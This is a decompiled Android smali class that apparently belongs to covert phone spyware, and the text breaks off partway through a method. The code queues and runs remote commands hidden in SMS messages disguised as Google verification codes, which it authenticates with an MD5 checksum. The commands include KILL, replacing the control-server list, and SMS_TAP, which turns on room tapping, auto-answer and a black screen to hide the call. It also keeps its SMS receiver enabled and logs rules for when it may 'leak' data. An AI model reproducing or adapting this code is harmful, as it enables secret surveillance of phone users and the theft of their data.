.class public final Lcom/network/android/a/b;
.super Ljava/lang/Object;


# static fields
.field private static a:Ljava/util/Vector;

.field private static b:Ljava/lang/Object;

.field private static c:Ljava/util/LinkedHashSet;

.field private static d:Ljava/lang/Object;

.field private static e:Ljava/util/regex/Pattern;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    sput-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/network/android/a/b;->b:Ljava/lang/Object;

    new-instance v0, Ljava/util/LinkedHashSet;

    const/16 v1, 0x3c

    invoke-direct {v0, v1}, Ljava/util/LinkedHashSet;-><init>(I)V

    sput-object v0, Lcom/network/android/a/b;->c:Ljava/util/LinkedHashSet;

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/network/android/a/b;->d:Ljava/lang/Object;

    return-void
.end method

.method public static a()V
    .locals 3

    :try_start_0
    sget-object v1, Lcom/network/android/a/b;->b:Ljava/lang/Object;

    monitor-enter v1
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    const-string v0, "clearCommandQueue start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    if-nez v0, :cond_0

    const-string v0, "clearCommandQueue command queue is null. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    monitor-exit v1

    :goto_0
    return-void

    :cond_0
    sget-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    invoke-virtual {v0}, Ljava/util/Vector;->clear()V

    const-string v0, "clearCommandQueue end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    :try_start_2
    monitor-exit v1

    throw v0
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "clearCommandQueue exception: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;)V
    .locals 11

    const/16 v10, 0x39

    const/16 v9, 0x30

    sget-object v1, Lcom/network/android/a/b;->b:Ljava/lang/Object;

    monitor-enter v1

    :try_start_0
    sget-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    if-nez v0, :cond_0

    const-string v0, "iterateOnCommandQueue command queue is null. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    monitor-exit v1

    :goto_0
    return-void

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "iterateOnCommandQueue queue size: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    invoke-virtual {v2}, Ljava/util/Vector;->size()I

    move-result v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    invoke-virtual {v0}, Ljava/util/Vector;->size()I

    move-result v0

    if-gtz v0, :cond_1

    const-string v0, "iterateOnCommandQueue command queue is empty. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    monitor-exit v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0

    :cond_1
    :goto_1
    :try_start_1
    sget-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    invoke-virtual {v0}, Ljava/util/Vector;->isEmpty()Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result v0

    if-nez v0, :cond_3

    :try_start_2
    sget-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    invoke-virtual {v0}, Ljava/util/Vector;->firstElement()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/network/android/a/a;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "iterateOnCommandQueue performing commandid: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-char v3, v0, Lcom/network/android/a/a;->f:C

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-char v2, v0, Lcom/network/android/a/a;->f:C

    iget-object v3, v0, Lcom/network/android/a/a;->b:Ljava/lang/String;

    iget-boolean v4, v0, Lcom/network/android/a/a;->i:Z

    iget-object v5, v0, Lcom/network/android/a/a;->h:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v6, "performCommand cmdId: "

    invoke-direct {v0, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v6, "performCommand msg: "

    invoke-direct {v0, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/h/j;->a()Z

    move-result v0

    if-eqz v0, :cond_4

    if-eq v2, v9, :cond_4

    const-string v0, "performCommand not performing command. we are on Upgrade state"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :cond_2
    :goto_2
    :try_start_4
    sget-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Ljava/util/Vector;->remove(I)Ljava/lang/Object;
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto :goto_1

    :catch_0
    move-exception v0

    :try_start_5
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "iterateOnCommandQueue outer exception\n- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :cond_3
    monitor-exit v1
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    goto/16 :goto_0

    :cond_4
    :try_start_6
    sget-boolean v0, Lcom/network/h/b;->a:Z

    if-eqz v0, :cond_5

    const-string v0, "performCommand not performing command. we are on remove application state"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_1
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto :goto_2

    :catch_1
    move-exception v0

    :try_start_7
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "performCommand exception\n- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_2
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    goto :goto_2

    :catch_2
    move-exception v0

    :try_start_8
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "iterateOnCommandQueue exception- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_0
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    goto :goto_2

    :cond_5
    :try_start_9
    const-string v0, "phone"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-static {v0}, Lcom/network/android/j;->a(Landroid/telephony/TelephonyManager;)Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-static {}, Lcom/network/b/b;->d()Z

    move-result v0

    if-nez v0, :cond_7

    if-eq v2, v9, :cond_6

    if-eq v2, v10, :cond_6

    const-string v0, "performCommand not performing command. we are roaming and according to the settings, we are not allowed to run commands or leak"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_2

    :cond_6
    if-ne v2, v10, :cond_7

    sget-boolean v0, Lcom/network/h/b;->c:Z

    if-eqz v0, :cond_7

    const-string v0, "performCommand not performing command. we got fetch command, but it is not upon installtion, so it will not be performed"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_1
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    goto/16 :goto_2

    :cond_7
    :try_start_a
    const-string v0, "Mo dontKill"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Landroid/content/ComponentName;

    const-class v6, Lcom/network/android/SmsReceiver;

    invoke-direct {v0, p0, v6}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    const/4 v7, 0x1

    const/4 v8, 0x1

    invoke-virtual {v6, v0, v7, v8}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_a
    .catch Ljava/lang/Throwable; {:try_start_a .. :try_end_a} :catch_3
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    :goto_3
    packed-switch v2, :pswitch_data_0

    :pswitch_0
    goto/16 :goto_2

    :pswitch_1
    const/4 v0, 0x1

    :try_start_b
    sput-boolean v0, Lcom/network/android/a/c;->i:Z

    const/4 v0, 0x1

    const/16 v2, 0x1c

    invoke-static {v0, v2}, Lcom/network/android/c/a/b;->a(IS)V

    const-string v0, "KILL"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    goto/16 :goto_2

    :catch_3
    move-exception v0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "Mo dontKill - "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_3

    :pswitch_2
    invoke-static {v3, p0, v5}, Lcom/network/android/a/c;->d(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_2

    :pswitch_3
    invoke-static {v3, p0, v5}, Lcom/network/android/a/c;->c(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;)V

    const-string v0, "httpPing SMS_LOC_MON"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v5}, Lcom/network/android/c/a/b;->a(Ljava/lang/String;)V

    const-string v0, "httpPing"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_2

    :pswitch_4
    const-string v0, "performCommand got SMS_SET"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v3}, Lcom/network/android/a/c;->b(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/b/b;->b([Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    invoke-static {v5}, Lcom/network/android/c/a/b;->a(Ljava/lang/String;)V

    if-eqz v4, :cond_2

    const-string v0, "httpPing"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_2

    :pswitch_5
    const-string v0, "performCommand got SMS_COMMAND_FETCH"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v3}, Lcom/network/android/a/c;->a(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lcom/network/b/b;->e()[Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/network/h/b;->a([Ljava/lang/String;[Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_8

    const-string v2, "performCommand SMS_COMMAND_FETCH can\'t find fetch commands ip in server list. replacing server list"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v0}, Lcom/network/b/b;->b([Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    :cond_8
    invoke-static {v5}, Lcom/network/android/c/a/b;->a(Ljava/lang/String;)V

    const-string v0, "httpPing"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_2

    :pswitch_6
    invoke-static {v3, v5, p0}, Lcom/network/android/a/c;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    const-string v0, "httpPing"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_2

    :pswitch_7
    invoke-static {v3, v5, p0}, Lcom/network/android/m;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    const-string v0, "httpPing"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_b
    .catch Ljava/lang/Throwable; {:try_start_b .. :try_end_b} :catch_1
    .catchall {:try_start_b .. :try_end_b} :catchall_0

    goto/16 :goto_2

    :pswitch_8
    :try_start_c
    const-string v0, "performCommand got SMS_TAP"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/k;->b:Z

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->d:Z

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/k;->c:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/a/c;->e:Z

    invoke-static {v5}, Lcom/network/android/a/c;->c(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_9

    invoke-static {v5}, Lcom/network/android/c/a/b;->a(Ljava/lang/String;)V

    :goto_4
    const-string v2, "httpPingTap"

    invoke-static {p0, v2}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    if-eqz v0, :cond_a

    const-string v0, "performCommand GOT_TAP_SMS_CALL_NOT_YET_ARRIVED setting it to true"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/a/c;->f:Z

    const-string v0, "performCommand BlackScreen opening tap screen"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v3, p0}, Lcom/network/android/a/c;->a(Ljava/lang/String;Landroid/content/Context;)V

    invoke-static {p0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->g(Landroid/content/Context;)V

    :goto_5
    const-string v0, "performCommand setting isSmsTap = false"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_c
    .catch Ljava/lang/Throwable; {:try_start_c .. :try_end_c} :catch_4
    .catchall {:try_start_c .. :try_end_c} :catchall_0

    goto/16 :goto_2

    :catch_4
    move-exception v0

    :try_start_d
    const-string v2, "performCommand exception. setting isSmsTap = false"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "performCommand SMS_TAP exception\n- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/a/c;->e:Z
    :try_end_d
    .catch Ljava/lang/Throwable; {:try_start_d .. :try_end_d} :catch_1
    .catchall {:try_start_d .. :try_end_d} :catchall_0

    goto/16 :goto_2

    :cond_9
    const/4 v2, 0x0

    const/16 v4, -0x3cae

    :try_start_e
    const-string v6, ""

    invoke-static {v5}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v2, v4, v6, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    goto :goto_4

    :cond_a
    const-string v0, "performCommand GOT_TAP_SMS_CALL_NOT_YET_ARRIVED setting it to false"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/a/c;->f:Z

    const-string v0, "performCommand Tap Window Forbidden"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/a/c;->a()V
    :try_end_e
    .catch Ljava/lang/Throwable; {:try_start_e .. :try_end_e} :catch_4
    .catchall {:try_start_e .. :try_end_e} :catchall_0

    goto :goto_5

    :pswitch_9
    :try_start_f
    invoke-static {v3, p0, v5}, Lcom/network/android/a/c;->b(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    const-string v0, "httpPing"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_f
    .catch Ljava/lang/Throwable; {:try_start_f .. :try_end_f} :catch_1
    .catchall {:try_start_f .. :try_end_f} :catchall_0

    goto/16 :goto_2

    nop

    :pswitch_data_0
    .packed-switch 0x30
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_0
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_5
    .end packed-switch
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 5

    const/4 v0, 0x0

    if-nez p1, :cond_1

    :cond_0
    :goto_0
    return v0

    :cond_1
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    const-string v2, "your google verification code"

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "s="

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    add-int/lit8 v2, v2, -0x1e

    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v1

    add-int/lit8 v2, v1, 0x2

    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    add-int/lit8 v1, v1, 0x2

    invoke-virtual {p1, v3, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0}, Lcom/network/android/SmsReceiver;->b(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v3, "MD5"

    invoke-static {v3}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object v3

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/security/MessageDigest;->update([B)V

    invoke-virtual {v3}, Ljava/security/MessageDigest;->digest()[B

    move-result-object v1

    const/16 v3, 0x8

    invoke-static {v1, v3}, Lcom/network/i/a;->a([BI)Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "checksum: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " hash "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v1, "Our command!!!!!!!"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    goto :goto_0

    :cond_2
    const-string v1, "Not Our command!!!!!!!"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "isOurCommand- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_0
.end method

.method public static a([BLandroid/content/Context;ZLjava/lang/String;)Z
    .locals 1

    const/4 v0, 0x0

    invoke-static {p0, p1, p2, p3, v0}, Lcom/network/android/a/b;->a([BLandroid/content/Context;ZLjava/lang/String;Ljava/lang/String;)Z

    move-result v0

    return v0
.end method

.method public static a([BLandroid/content/Context;ZLjava/lang/String;Ljava/lang/String;)Z
    .locals 8

    const/4 v2, 0x0

    const/4 v1, 0x1

    const/4 v0, 0x0

    :try_start_0
    const-string v3, "addCommandToQueue start "

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v3, Lcom/network/android/a/b;->b:Ljava/lang/Object;

    monitor-enter v3
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    sget-object v4, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    if-nez v4, :cond_0

    new-instance v4, Ljava/util/Vector;

    invoke-direct {v4}, Ljava/util/Vector;-><init>()V

    sput-object v4, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    :cond_0
    monitor-exit v3
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    new-instance v4, Lcom/network/android/a/a;

    invoke-direct {v4}, Lcom/network/android/a/a;-><init>()V

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, p0}, Ljava/lang/String;-><init>([B)V

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue commandData:\n"

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v3, "&s="

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    add-int/lit8 v6, v6, -0x1e

    invoke-virtual {v5, v3, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v3

    add-int/lit8 v6, v3, 0x3

    invoke-virtual {v5, v6}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v4, Lcom/network/android/a/a;->a:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "addCommandToQueue command checksum:\n"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, v4, Lcom/network/android/a/a;->a:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v6, 0x0

    add-int/lit8 v3, v3, 0x3

    invoke-virtual {v5, v6, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue command msg choped:\n"

